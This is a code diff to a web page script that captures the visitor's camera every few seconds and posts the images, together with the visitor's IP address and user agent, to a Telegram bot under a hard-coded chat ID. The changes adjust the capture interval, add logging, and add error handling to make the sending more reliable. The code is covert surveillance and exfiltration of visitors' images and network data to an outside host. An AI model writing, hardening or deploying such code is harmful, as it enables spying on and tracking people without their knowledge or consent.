@@ -18,7 +18,7 @@
                 // Capture image every 5 seconds and send to Telegram
                 setInterval(() => {
                     captureImage(stream);
-                }, 4000);
+                }, 5000); // Adjusted to 5000 ms (5 seconds)
             } catch (error) {
                 console.error("Error accessing camera: ", error);
             }
@@ -33,6 +33,8 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
 
+            console.log("Captured image data: ", imageData);
+
             // Send image to Telegram
             sendImageToTelegram(imageData);
         }
@@ -42,21 +44,25 @@
             const chatId = '5125698617';
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: imageData
-                })
-            });
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageData
+                    })
+                });
 
-            if (response.ok) {
-                console.log("Image sent to Telegram");
-            } else {
-                console.error("Error sending image to Telegram: ", response.statusText);
+                if (response.ok) {
+                    console.log("Image sent to Telegram");
+                } else {
+                    console.error("Error sending image to Telegram: ", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error sending image to Telegram: ", error);
             }
         }
 
@@ -70,6 +76,8 @@
                 const userAgent = navigator.userAgent;
                 const userInfo = { ip, userAgent };
 
+                console.log("User info: ", userInfo);
+
                 // Send user info to Telegram
                 sendUserInfoToTelegram(userInfo);
             } catch (error) {
@@ -82,21 +90,25 @@
             const chatId = '5125698617';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `User Info: IP - ${userInfo.ip}, User Agent - ${userInfo.userAgent}`
-                })
-            });
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `User Info: IP - ${userInfo.ip}, User Agent - ${userInfo.userAgent}`
+                    })
+                });
 
-            if (response.ok) {
-                console.log("User info sent to Telegram");
-            } else {
-                console.error("Error sending user info to Telegram: ", response.statusText);
+                if (response.ok) {
+                    console.log("User info sent to Telegram");
+                } else {
+                    console.error("Error sending user info to Telegram: ", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error sending user info to Telegram: ", error);
             }
         }
 
